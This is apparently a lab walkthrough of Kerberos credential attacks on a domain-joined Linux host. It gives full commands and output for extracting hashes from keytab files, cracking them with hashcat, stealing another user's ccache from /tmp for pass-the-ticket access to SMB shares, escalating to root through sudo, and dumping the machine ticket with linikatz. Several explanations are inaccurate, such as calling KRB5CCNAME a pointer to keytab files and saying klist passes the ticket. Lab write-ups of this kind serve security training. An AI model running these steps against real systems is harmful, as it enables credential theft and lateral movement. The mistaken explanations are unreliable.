
## Kerberos on Linux

- Linux machines store **Kerberos Tickets** in `ccache files` in the `/tmp` directory. By default the Kerberos ticket is stored in the environment variable `KRB5CCNAME`.
- The `KRB5CCNAME` environment variable can identify if **Kerberos tickets** are being used or the default location of the tickets has changed.
- It also has `keytab` files where Kerberos encrypted keys and credentials are present.

## `keytab` file

- `keytab` is a file containing Kerberos principals and encrypted keys (which are derived from the **Kerberos password**). 
- To use a `keytab` file, the user must have **read and write** privileges.


## `ccache` file

- A credential cache or `ccache` file holds Kerberos credentials while they remain valid, generally while the user's session lasts. Once a user authenticates to the domain, a `ccache` file is created that stores the ticket information. The path is placed in the `KRBCCNAME` environment variable.
-  Linux machines store **Kerberos Tickets** in `ccache files` in the `/tmp` directory.


## `KRB5CCNAME` 

- an environment variable that tells Kerberos where to find the active user's credentials and ticket cache

 
 
## What does the `ccache` file contain?

A credential cache (`ccache`) file is a binary file that stores your **temporary network passports**. It **does not** contain the user's cleartext password, and it **does not** contain the user's NTLM hash.

Instead, it contains two primary things:

- **The TGT (Ticket Granting Ticket):** This is an encrypted piece of data issued by the Active Directory Domain Controller (DC). It serves as proof that the user successfully logged in earlier.
- **Session Keys:** Cryptographic keys that the client uses to encrypt communication with the Domain Controller when asking for access to specific network resources (like file shares).

## What does `SSSD` contain?

**SSSD** (System Security Services Daemon) is a background system service, not a single file.

- It holds the **active configurations and connections** to the Active Directory domain controller.
- It handles a local cache database (usually under `/var/lib/sss/db/`) containing user information (like UIDs, groups, and SIDs) so the Linux machine knows what permissions Active Directory users have locally.
- When a user logs in, SSSD is the mechanism that talks to the DC, receives the Kerberos TGT, and **writes it down into the `ccache` file** inside `/tmp`.

## Why does exporting the `KRB5CCNAME` trigger a Pass-the-Ticket?

When you run `export KRB5CCNAME=/tmp/krb5cc_...`, you are exploiting a fundamental rule of how the Kerberos client libraries work on Linux.

Here is the step-by-step sequence of the attack:

Step A: Changing the Pointer

By default, every process checks the environment variable `KRB5CCNAME` to find its Kerberos tickets. When you change this variable to point to Julio’s ticket file, you are changing the system's "pointer."

Step B: Running `klist`

When you type `klist`, the command does not check your local Linux username (`whoami`). Instead, it reads the path specified in `KRB5CCNAME`, parses the binary data inside that specific `ccache` file, and prints out the owner (`Default principal: julio@INLANEFREIGHT.HTB`) and the TGT details.

Step C: The Network Interaction (The "Pass")

When you use a network tool like `smbclient.py -k`, the tool automatically reads the `KRB5CCNAME` variable, pulls the TGT out of Julio's `ccache` file, and sends it directly across the network to the Windows Domain Controller.

Because the TGT is cryptographically signed by the Domain Controller itself, the Domain Controller trusts it blindly. The DC reads the ticket, sees that it belongs to Julio, and says: _"This ticket is valid. You have access to Julio's files."_

The DC has no idea that a local Linux `root` user stole the file from `/tmp`; it only sees a perfectly valid network passport.

Now that you know how the Kerberos storage functions, if you ran into a `session setup failed: NT_STATUS_INVALID_PARAMETER` error on your last SMB attempt, it usually means the tool struggled with the domain format or the machine name resolution.

---
## Questions and Solutions


- Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.
	- **`Gett1ng_Acc3$$_to_LINUX01`**

##### SSH into the Target

Using the `ssh` command to log into the target system with the given credentials and then reading the flag.

```bash
❯ ssh david@inlanefreight.htb@10.129.204.23 -p 2222
The authenticity of host '[10.129.204.23]:2222 ([10.129.204.23]:2222)' can't be established.
ED25519 key fingerprint is: SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.129.204.23]:2222' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
david@inlanefreight.htb@10.129.204.23's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 05 Oct 2026 06:03:10 AM UTC

  System load:  0.44               Processes:               244
  Usage of /:   26.3% of 13.70GB   Users logged in:         0
  Memory usage: 24%                IPv4 address for ens160: 172.16.1.15
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

3 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Oct 25 13:23:44 2022 from 172.16.1.5
david@inlanefreight.htb@linux01:~$ whoami
david@inlanefreight.htb
david@inlanefreight.htb@linux01:~$ ls
flag.txt
david@inlanefreight.htb@linux01:~$ cat flag.txt
{redacted}
```


- Which group can connect to LINUX01? 
	- **Linux Admins**


##### checking the `group` permissions

```bash
david@inlanefreight.htb@linux01:~$ realm list
inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```


- Look for a keytab file that you have read and write access. Submit the file name as a response.
	- **carlos.keytab**


##### Finding the `keytabs`

Based on the output `carlos.keytab` has read and write permissions.

```bash
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
   287437      4 -rw-r--r--   1 root     root         2110 Aug  9  2021 /usr/lib/python3/dist-packages/samba/tests/dckeytab.py
   288276      4 -rw-r--r--   1 root     root         1871 Oct  4  2022 /usr/lib/python3/dist-packages/samba/tests/__pycache__/dckeytab.cpython-38.pyc
   287720     24 -rw-r--r--   1 root     root        22768 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/ldb/update_keytab.so
   286812     28 -rw-r--r--   1 root     root        26856 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/libnet-keytab.so.0
   131610      4 -rw-------   1 root     root         2694 Oct  5 16:17 /etc/krb5.keytab
   262464     12 -rw-r--r--   1 root     root        10015 Oct  4  2022 /opt/impacket/impacket/krb5/keytab.py
   262619      4 -rw-rw-rw-   1 root     root          216 Oct  5 16:30 /opt/specialfiles/carlos.keytab
   131201      8 -rw-r--r--   1 root     root         4582 Oct  6  2022 /opt/keytabextract.py
   287958      4 drwx------   2 sssd     sssd         4096 Jun 21  2022 /var/lib/sss/keytabs
   398204      4 -rw-r--r--   1 root     root          380 Oct  4  2022 /var/lib/gems/2.7.0/doc/gssapi-1.3.1/ri/GSSAPI/Simple/set_keytab-i.ri
```

- Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.
	- **C@rl0s_1$_H3r3**

##### Extracting hashes from `carlos.keytab`

```bash
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c
```

Cracking the NTLM hash using `hashcat`.

```bash
❯ hashcat -a 0 -m 1000 a738f92b3c08b424ec2d99589a9cce60 
...(SNIP)...
a738f92b3c08b424ec2d99589a9cce60:Password5                
...(SNIP)...
```

Finding the actual account name of the `carlos` user inside the Active Directory by checking the `/tmp` directory. `carlos` doesn't exist locally on the machine we `SSH` ed into but in the Active Directory network it does exist so we use the `@inlanefreight.htb` which is the domain name of the network and `carlos` password to authenticate itself.

```bash
david@inlanefreight.htb@linux01:~$ ls -l /tmp
total 40
-rw------- 1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  5 17:30 krb5cc_647401106_HRJDux
-rw------- 1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1414 Oct  5 17:30 krb5cc_647401106_IwkSrA
-rw------- 1 david@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  5 17:05 krb5cc_647401107_LrmXd7
-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1746 Oct  5
...(SNIP)...
```

Logging in as `carlos` user and then reading the flag.

```bash
david@inlanefreight.htb@linux01:~$ su carlos@inlanefreight.htb
Password: 
carlos@inlanefreight.htb@linux01:/home/david@inlanefreight.htb$ cd ~
carlos@inlanefreight.htb@linux01:~$ ls
flag.txt  script-test-results.txt
carlos@inlanefreight.htb@linux01:~$ cat flag.txt 
{redacted}
```


- Check Carlos' crontab, and look for keytabs to which Carlos has access. Try to get the credentials of the user svc_workstations and use them to authenticate via SSH. Submit the flag.txt in svc_workstations' home directory.
	- **`Mor3_4cce$$_m0r3_Pr1v$`**


##### Checking the `cronjob`

```bash
carlos@inlanefreight.htb@linux01:~$ crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```

We find that `carlos` user can run this particular script so I first checked its contents. The contents tell us that `carlos` is using the `svc_workstations.kt` to authenticate himself as `svc_workstations` in the Active Directory network. We can try to extract the hashes from the `svc_workstations.kt` file now.

```bash
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

Extracting hashes from the keytab file `.kt`

```bash
carlos@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
[!] No RC4-HMAC located. Unable to extract NTLM hashes.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : svc_workstations/
        AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
```

We didn't find any NTLM hash we lets run try to find `.kt` files once again to check whether we missed something or not.

```bash
carlos@inlanefreight.htb@linux01:/home/david@inlanefreight.htb$ find / -name '*.kt*' -ls 2>/dev/null
   262620      4 -rw-------   1 carlos@inlanefreight.htb domain users@inlanefreight.htb      246 Oct  5 18:25 /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
   262607      4 -rw-------   1 carlos@inlanefreight.htb domain users@inlanefreight.htb       94 Oct  5 18:25 /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
```

We find a new `.kt` file so lets try to extract hashes from that file.

```bash
carlos@inlanefreight.htb@linux01:/home/david@inlanefreight.htb$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : svc_workstations/
        NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd
        AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
        AES-128 HASH : 3a7e52143531408f39101187acc80677
```

We get our `NTLM` hash finally, now we can crack it using `hashcat`.

```bash
❯ hashcat -a 0 -m 1000 7247e8d4387e76996ff3f18a34316fdd
...(SNIP)...
7247e8d4387e76996ff3f18a34316fdd:Password4                
...(SNIP)...
```

Logging in as `svc_workstations@INLANEFREIGHT.HTB` and reading the flag.

```bash
carlos@inlanefreight.htb@linux01:/home/david@inlanefreight.htb$ su svc_workstations@INLANEFREIGHT.HTB
Password: 
svc_workstations@inlanefreight.htb@linux01:/home/david@inlanefreight.htb$ cd ~
svc_workstations@inlanefreight.htb@linux01:~$ ls
flag.txt
svc_workstations@inlanefreight.htb@linux01:~$ cat flag.txt
{redacted}
```


- Check the sudo privileges of the svc_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response.
	- **Ro0t_Pwn_K3yT4b**


##### Checking `svc_workstations` sudo privileges

```bash
svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
[sudo] password for svc_workstations@inlanefreight.htb: 
Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_workstations@inlanefreight.htb may run the following commands on linux01:
    (ALL) ALL
```

From this we can conclude that `svc_workstations` is a sudo user and since we already has the password of the user we can login as `root` and read the flag contents.

```bash
svc_workstations@inlanefreight.htb@linux01:~$ sudo su
root@linux01:/home/svc_workstations@inlanefreight.htb# whoami
root
root@linux01:/home/svc_workstations@inlanefreight.htb# cat /root/flag.txt 
{redacted}
```


- Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio.
	- **JuL1()_SH@re_fl@g**


##### Finding `julio's` keytab

```bash
root@linux01:/home/svc_workstations@inlanefreight.htb# ls -l /tmp
total 48
-rw------- 1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  5 19:05 krb5cc_647401106_HRJDux
-rw------- 1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1414 Oct  5 19:05 krb5cc_647401106_R08aa1
...(SNIP)...
```

Since we are root user we have read and write privileges of the keytab of `julio` so we will `keytabextract.py` to extract the hashes from the keytab and impersonate as the `julio` user.  First let's export these files because they are `ccache` files and `keytabextract.py` will not work on them. This `krb5cc` are Kerberos temporary session cache files.


##### What does `exporting` means here

Kerberos in Linux has an environment variable named `KRB5CCNAME` which is used to find keytab files so by exporting we are telling the Kerberos to authenticate us as the `julio` user for the current terminal environment.

```bash
root@linux01:/home/svc_workstations@inlanefreight.htb# cd /tmp
root@linux01:/tmp# export KRB5CCNAME=krb5cc_647401106_HRJDux 
root@linux01:/tmp# klist
Ticket cache: FILE:krb5cc_647401106_HRJDux
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 11:32:01
```

After successful execution of the `klist` command, Linux would assume you are currently the `julio`  user in the AD network but locally still as `root`. Lets check this by connecting to the `DC01` domain controller network share using `smbclient`.

```bash
root@linux01:/tmp# smbclient //DC01/julio -c ls -k -no-pass
gensec_spnego_client_negTokenInit_step: gse_krb5: creating NEG_TOKEN_INIT for cifs/DC01 failed (next[(null)]): NT_STATUS_INVALID_PARAMETER
session setup failed: NT_STATUS_INVALID_PARAMETER
```

The ticket has expired so lets try the other ticket. Same procedure exporting the `ccname` file and then using `klist` to pass the ticket.

```bash
root@linux01:/tmp# export KRB5CCNAME=krb5cc_647401106_R08aa1
root@linux01:/tmp# klist
Ticket cache: FILE:krb5cc_647401106_R08aa1
Default principal: julio@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/05/2026 19:05:30  10/06/2026 05:05:30  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/06/2026 19:05:30
```

Trying to access the `//DC01/julio` network share using `smbclient`.

```bash
smblicent: command not found
root@linux01:/tmp# smbclient //DC01/julio -c ls -k -no-pass
  .                                   D        0  Thu Jul 14 12:25:24 2022
  ..                                  D        0  Thu Jul 14 12:25:24 2022
  julio.txt                           A       17  Thu Jul 14 21:18:12 2022

                7706623 blocks of size 4096. 4459693 blocks available
```

Great! we can access the network share, so lets try to get the file `julio.txt` and read its contents.

```bash
root@linux01:/tmp# smbclient //DC01/julio -c 'get julio.txt' -k -no-pass && cat julio.txt
getting file \julio.txt of size 17 as julio.txt (16.6 KiloBytes/sec) (average 16.6 KiloBytes/sec)
{redacted}root@linux01:/tmp# 
```


- Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_).
	- **Us1nG_KeyTab_Like_@_PRO**

Domain-joined Linux machines have their own Kerberos ticket — the **machine account TGT** — stored in SSSD’s cache. If we can access it as root, we can use it to authenticate as the machine account (`LINUX01$`) and access resources that machine account has permissions to.

`linikatz` is a Linux port of Mimikatz concepts — it extracts Kerberos tickets, keytabs, and credentials from a Linux machine's credential stores. Download it on the attacker machine and serve it:


```bash
root@linux01:/tmp# chmod 777 linikatz.sh 
root@linux01:/tmp# ./linikatz.sh 
 _ _       _ _         _
| (_)_ __ (_) | ____ _| |_ ____
| | | '_ \| | |/ / _` | __|_  /
| | | | | | |   < (_| | |_ / /
|_|_|_| |_|_|_|\_\__,_|\__/___|

             =[ @timb_machine ]=

I: [freeipa-check] FreeIPA AD configuration
-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Foundation-Firmware
-rw-r--r-- 1 root root 1702 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Hughski-Limited
-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd/LVFS-CA.pem
-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Foundation-Metadata
-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Vendor-Firmware-Service
-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd-metadata/LVFS-CA.pem
I: [sss-check] SSS AD configuration
-rw------- 1 root root 1609728 Oct  5 19:25 /var/lib/sss/db/timestamps_inlanefreight.htb.ldb
-rw------- 1 root root 1286144 Oct  5 18:22 /var/lib/sss/db/config.ldb
-rw------- 1 root root 4154 Oct  5 19:25 /var/lib/sss/db/ccache_INLANEFREIGHT.HTB
-rw------- 1 root root 1609728 Oct  5 19:25 /var/lib/sss/db/cache_inlanefreight.htb.ldb
-rw------- 1 root root 1286144 Oct  4  2022 /var/lib/sss/db/sssd.ldb
-rw-rw-r-- 1 root root 10406312 Oct  5 19:25 /var/lib/sss/mc/initgroups
-rw-rw-r-- 1 root root 6406312 Oct  5 19:25 /var/lib/sss/mc/group
-rw-rw-r-- 1 root root 8406312 Oct  5 19:25 /var/lib/sss/mc/passwd
-rw-r--r-- 1 root root 113 Oct  5 18:22 /var/lib/sss/pubconf/krb5.include.d/localauth_plugin
-rw-r--r-- 1 root root 40 Oct  5 18:22 /var/lib/sss/pubconf/krb5.include.d/krb5_libdefaults
-rw-r--r-- 1 root root 15 Oct  5 18:22 /var/lib/sss/pubconf/krb5.include.d/domain_realm_inlanefreight_htb
-rw-r--r-- 1 root root 12 Oct  5 19:25 /var/lib/sss/pubconf/kdcinfo.INLANEFREIGHT.HTB
-rw------- 1 root root 504 Oct  6  2022 /etc/sssd/sssd.conf
...(SNIP)...
```

Export the `/var/lib/sss/db/ccache_INLANEFREIGHT.HTB` to `KRB5CCNAME` and then pass the ticket using `klist`.

```bash
export KRB5CCNAME=/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
root@linux01:/tmp# klist
Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
Default principal: LINUX01$@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/05/2026 19:25:31  10/06/2026 05:25:31  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/06/2026 19:25:31
10/05/2026 19:25:31  10/06/2026 05:25:31  ldap/dc01.inlanefreight.htb@
        renew until 10/06/2026 19:25:31
10/05/2026 19:25:31  10/06/2026 05:25:31  ldap/dc01.inlanefreight.htb@INLANEFREIGHT.HTB
        renew until 10/06/2026 19:25:31
```

Now that we have passed the ticket of the machine user account `LINUX01`. We can use `smblclient` to connect to the share and download the `flag.txt` and read its content.

```bash
root@linux01:/tmp# smbclient //DC01/linux01 -c 'ls' -k -no-pass
  .                                   D        0  Wed Oct  5 14:17:02 2022
  ..                                  D        0  Wed Oct  5 14:17:02 2022
  flag.txt                            A       52  Wed Oct  5 14:17:02 2022

                7706623 blocks of size 4096. 4456001 blocks available
root@linux01:/tmp# smbclient //DC01/linux01 -c 'get flag.txt' -k -no-pass && cat flag.txt
getting file \flag.txt of size 52 as flag.txt (50.8 KiloBytes/sec) (average 50.8 KiloBytes/sec)
��{redacted}
```